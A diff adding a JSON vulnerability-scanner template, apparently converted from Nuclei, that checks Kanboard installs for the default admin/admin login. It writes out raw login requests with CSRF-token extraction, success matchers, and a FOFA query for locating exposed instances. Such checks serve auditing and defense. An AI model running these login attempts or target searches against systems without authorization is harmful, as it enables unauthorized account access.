@@ -1,0 +1,159 @@
+{
+  "id": "kanboard-default-login",
+  "name": "Kanboard - Default Login",
+  "author": "shelled",
+  "severity": "HIGH",
+  "description": "Kanboard contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.",
+  "references": [
+    "https://twitter.com/0x_rood/status/1607068644634157059",
+    "https://github.com/kanboard/kanboard",
+    "https://docs.kanboard.org/v1/admin/installation/"
+  ],
+  "tags": [
+    "default-login",
+    "kanboard"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"Kanboard\""
+  },
+  "variables": {
+    "pass": [
+      "admin"
+    ],
+    "user": [
+      "admin"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "cweId": "CWE-522",
+  "cvssScore": "8.3",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /?controller\u003dAuthController\u0026action\u003dlogin HTTP/1.1\nHost: {{Hostname}}\n",
+        "POST /?controller\u003dAuthController\u0026action\u003dcheck HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername\u003d{{user}}\u0026password\u003d{{pass}}\u0026csrf_token\u003d{{csrf_token}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(location, \u0027controller\u003dDashboardController\u0026action\u003dshow\u0027)",
+            "status_code \u003d\u003d 302"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "kanboard-default-login",
+    "info": {
+      "name": "Kanboard - Default Login",
+      "author": "shelled",
+      "severity": "high",
+      "description": "Kanboard contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.",
+      "reference": [
+        "https://twitter.com/0x_rood/status/1607068644634157059",
+        "https://github.com/kanboard/kanboard",
+        "https://docs.kanboard.org/v1/admin/installation/"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+        "cvss_score": "8.3",
+        "cwe_id": "CWE-522"
+      },
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "app\u003d\"Kanboard\""
+      },
+      "tags": "default-login,kanboard"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "user": [
+            "admin"
+          ],
+          "pass": [
+            "admin"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /?controller\u003dAuthController\u0026action\u003dlogin HTTP/1.1\nHost: {{Hostname}}\n",
+          "POST /?controller\u003dAuthController\u0026action\u003dcheck HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername\u003d{{user}}\u0026password\u003d{{pass}}\u0026csrf_token\u003d{{csrf_token}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(location, \u0027controller\u003dDashboardController\u0026action\u003dshow\u0027)",
+              "status_code \u003d\u003d 302"
+            ],
+            "condition": "and"
+          }
+        ],
+        "extractors": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "hidden\" name\u003d\"csrf_token\" value\u003d\"([0-9a-z]+)\""
+            ],
+            "group": 1,
+            "name": "csrf_token",
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
